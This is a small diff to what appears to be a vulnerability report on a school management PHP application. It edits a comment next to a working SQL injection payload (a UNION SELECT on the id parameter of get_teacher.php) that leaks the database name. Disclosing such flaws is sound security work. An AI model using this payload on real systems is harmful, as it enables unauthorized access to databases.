@@ -8,7 +8,7 @@ Vulnerability File: /school/model/get_teacher.php?id=
 
 Vulnerability location: /school/model/get_teacher.php?id=,id
 
-[+] Payload: /school/model/get_teacher.php?id=-10%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> client_id
+[+] Payload: /school/model/get_teacher.php?id=-10%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> id
 
 Current database name: std_db,length is 6
 
